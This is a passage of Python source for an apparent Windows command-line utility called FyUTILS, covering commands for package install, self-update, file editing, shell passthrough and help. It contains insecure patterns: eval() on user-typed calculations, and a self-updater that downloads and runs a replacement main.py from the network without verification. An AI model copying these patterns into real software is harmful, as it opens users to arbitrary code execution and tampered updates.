                        print(prefix() + "Canceling Action...")
                        print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                        break

            case "getip":
                update_status("Getting user's IP address...")
                print(prefix() + requests.get("https://api.ipify.org/").content.decode())

            case "fuels":
                print(prefix() + "Active FUELS:")
                for fuel in get_fuels():
                    print(prefix() + fuel)

            case "fuel":
                if len(args) < 2:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                action = args[0]
                package = args[1]
                activity_start = time.time()

                if action == "install" or action == "update":
                    print(prefix("INFO") + "Installing package " + colors["MAGENTA"] + package + colors["WHITE"] + "...")
                    package_name = package + ".fuel"
                    print(prefix("INFO") + "Checking repository...")
                    try:
                        repo_content = requests.get(fuel_repository).json()
                    except Exception:
                        print(prefix("ERROR") + "Package " + package + colors["WHITE"] + " installation failed!")
                        print(prefix("ERROR") + "Error: Repository not reachable.")
                        continue
                    print(prefix("INFO") + "Checking package...")
                    url = ""
                    for i in range(len(repo_content)):
                        if repo_content[i]["name"] == package_name:
                            url = repo_content[i]["download_url"]
                    if url == "":
                        print(prefix("ERROR") + "Package " + package + colors["WHITE"] + " installation failed!")
                        print(prefix("ERROR") + "Error: Package not found.")
                        continue
                    print(prefix("INFO") + "Found " + colors["MAGENTA"] + package + colors["WHITE"] + " in NoahOnFyre/FUELS!")
                    print(prefix("INFO") + "Fetching " + colors["MAGENTA"] + package + colors["WHITE"] + "...")
                    content = requests.get(url).content
                    print(prefix("INFO") + "Preparing local file...")
                    fuel = open(fuel_content_dir + package_name, "wb")
                    print(prefix("INFO") + "Writing content to file...")
                    fuel.write(content)
                    print(prefix("INFO") + "Closing IO for file...")
                    fuel.close()
                    print(prefix("INFO") + "Done! Package installation of " + colors["MAGENTA"] + package + colors["WHITE"] + f" took {time.time() - activity_start:0.2f} seconds.")
                elif action == "remove":
                    print(prefix("INFO") + "Checking package...")
                    if get_fuels().__contains__(package + ".fuel"):
                        print(prefix("INFO") + "Removing package...")
                        os.remove(fuel_content_dir + package + ".fuel")
                    print(prefix("INFO") + "Done! Package deletion of " + colors["MAGENTA"] + package + colors["WHITE"] + f" took {time.time() - activity_start:0.2f} seconds.")

            case "update":
                update_status("Updating FyUTILS...")

                if update_available:
                    print(prefix("INFO") + "Update found!")
                    print(prefix("INFO") + "Version Comparison: " + colors["RED"] + version + colors["GRAY"] + " => " + colors["GREEN"] + newest_version + colors["WHITE"] + "...")
                    shutil.copy(current_dir + "\\main.py", tmp_dir + "\\BACKUP-" + version + ".py")
                    newest_file_content = requests.get(release_download_url).content
                    temp = open(current_dir + "\\main.py", mode="wb")
                    temp.write(newest_file_content)
                    print(prefix("INFO") + "Update successfully installed!")
                    print(prefix("INFO") + "Restarting FyUTILS...")
                    temp.close()
                    execute("start " + current_dir + "\\main.py")
                    sys.exit(512)
                else:
                    print(prefix("INFO") + "You're running the latest version of FyUTILS!")
                    print(prefix("INFO") + "Version comparison: " + colors["GREEN"] + version + colors["GRAY"] + " == " + colors["GREEN"] + newest_version + colors["WHITE"] + "...")

            case "edit":
                if len(args) < 1:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                filepath = args[0]
                activity_start = time.time()
                update_status("Editing " + filepath + "...")

                if not os.path.exists(filepath):
                    print(prefix("WARN") + "File not found!")
                    confirmation = input(prefix() + "Do you want to let FyUTILS create a new file? (y/n): ")
                    if confirmation.lower() == "n":
                        continue
                    file = open(filepath, "x+")
                    print(prefix() + "File created successfully.")
                    print(prefix() + "End file editing by entering \"END\".")
                else:
                    file = open(filepath, "w+")
                    print(prefix() + "File opened successfully.")
                    print(prefix() + "End file editing by entering \"END\".")
                ln = ""
                for i in range(1, sys.maxsize):
                    try:
                        line = input(str(i) + ": ")
                        if line == "END":
                            break
                        ln = ln + line + "\n"
                    except KeyboardInterrupt:
                        print("END")
                        print()
                        break
                print(prefix() + "Writing cached content to " + filepath + "...")
                file.writelines(ln)
                print(prefix() + "Saving file to " + filepath + "...")
                print(prefix() + "Closing " + filepath + "...")
                file.close()
                print(prefix() + "File is saved and closed!")
                print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")

            case "calc":
                if len(args) < 1:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                calculation = args[0]
                activity_start = time.time()
                update_status("Calculating " + calculation)

                print(prefix() + calculation + " is " + str(eval(calculation)))

            case "read":
                if len(args) != 1:
                    print(prefix("ERROR") + "Unexpected arguments for command \"" + cmd + "\"")
                    continue
                filepath = args[0]
                activity_start = time.time()
                update_status("Reading " + filepath + "...")

                if not os.path.exists(filepath):
                    print(prefix("ERROR") + "File not found!")
                    continue
                else:
                    file = open(filepath, "rt")
                    print(prefix() + "File opened successfully.")
                i = 1
                for line in file.readlines():
                    print(str(i) + ": " + line, end="\r")
                    i += 1
                print(prefix() + "Closing " + filepath + "...")
                file.close()
                print(prefix() + f"Time elapsed: {time.time() - activity_start: 0.2f}s")

            case "ls":
                try:
                    print(prefix() + "Content of " + os.getcwd())
                    for file in os.listdir(os.getcwd()):
                        if file.startswith("."):
                            if os.path.isfile(file):
                                print(prefix() + colors["GRAY"] + file)
                            elif os.path.isdir(file):
                                print(prefix() + colors["GRAY"] + "/" + file)
                        elif os.path.isfile(file):
                            print(prefix() + file)
                        elif os.path.isdir(file):
                            print(prefix() + colors["GREEN"] + "/" + file)
                except Exception as e:
                    print("\n" + prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                    print(prefix("ERROR") + str(e))
                    print()

            case "shell":
                update_status("Executing system command \"" + request_raw.removeprefix("shell ") + "\"")

                execute(request_raw.removeprefix("shell "))

            case "exit":
                update_status("Shutting down...")
                print(prefix() + "Shutting down FyUTILS...")
                try:
                    time.sleep(1)
                except KeyboardInterrupt:
                    print(prefix() + "Canceling action")
                    continue
                print("logout")
                sys.exit(0)

            case "cd":
                if len(args) < 1:
                    print(prefix() + os.getcwd())
                    continue
                change_dir = args[0]
                activity_start = time.time()
                update_status("Switching to " + change_dir + "...")

                match change_dir:
                    case "~":
                        change_dir = user_dir

                    case "#":
                        change_dir = current_dir

                    case "@":
                        change_dir = appdata_dir

                    case "/":
                        change_dir = "C:\\"

                    case _:
                        change_dir = change_dir

                try:
                    os.chdir(change_dir)
                    if os.getcwd() == current_dir:
                        cwd_abbreviation = "#"
                    elif os.getcwd() == "C:\\":
                        cwd_abbreviation = "/"
                    elif os.getcwd() == user_dir:
                        cwd_abbreviation = "~"
                    elif os.getcwd() == appdata_dir:
                        cwd_abbreviation = "@"
                    else:
                        cwd_abbreviation = os.getcwd()
                    print(prefix() + cwd_abbreviation)
                except Exception as e:
                    print("\n" + prefix("ERROR") + "An error occurred while trying to execute this command correctly.")
                    print(prefix("ERROR") + str(e))
                    print()

            case "help":
                if len(args) < 1:
                    update_status("Viewing help...")
                    execute("start https://github.com/NoahOnFyre/FyUTILS#commands")
                    continue
                command = args[0]
                update_status("Viewing " + command + " in help...")
                execute("start https://github.com/NoahOnFyre/FyUTILS#" + command)

            case "raise":
                update_status("Raising exception...")
                raise Exception("Executed by raise command.")

            case "clear" | "rl" | "reload" | "cls":
                update_status("Reloading...")
                execute("cls")
                menu()

            case "restart" | "rs":
                update_status("Restarting...")
                print("logout")
                execute("start " + current_dir + "\\main.py")
                print("login")
                sys.exit(0)

            case _:
                if get_fuels().__contains__(cmd + ".fuel"):
                    run_fuel(cmd, request)
                else:
                    if exec_code(request_raw) == 1:
                        update_status("Executing " + cmd)
                        print(prefix("ERROR") + "Invalid command: \"" + cmd + "\".")
                    else:
                        update_status("Executing " + cmd)
                        execute(request_raw)
except Exception as e:
    execute("title FyUTILS Crash Handler - Crash Log")
    print(prefix("ERROR") + "FyUTILS CRASH LOG @ " + datetime.datetime.now().strftime("%H:%M:%S"))
    print(prefix("ERROR") + "Error: " + str(e))
    print(prefix("ERROR") + "The full crash log has been saved to: " + main_dir + "crash.log")
    print(prefix("ERROR") + "When you want to file an issue, please remember to also upload your crash.log file.")
    crash_log()
    pause("ERROR")
    sys.exit(1024)
